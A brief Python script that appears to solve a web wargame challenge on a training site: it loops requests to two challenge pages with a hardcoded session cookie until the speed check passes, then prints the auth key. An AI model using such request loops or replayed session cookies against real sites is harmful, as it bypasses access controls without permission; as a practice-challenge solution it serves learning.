import requests

URL1="http://suninatas.com/Part_one/web07/web07.asp"
URL2="http://suninatas.com/Part_one/web07/web07_1.asp"

session1=requests.Session()
cookie={
    "ASPSESSIONIDQSAQARDT":"HDINHHNDFFMIMMMGMPKJKFEH"
    }

while True:
    req1=session1.get(URL1, cookies=cookie)
    req2=session1.get(URL2, cookies=cookie)
    
    if (req2.text.find("Your too slow") == -1) :
        index1=req2.text.find("Authkey")
        print ("\n\n")
        print (req2.text[ index1 : index1 + 18 ])
        input("\n\nPress any KEY to exit.....\n")
        exit (0)
    else :
        print ("Fail... Requests Again!")
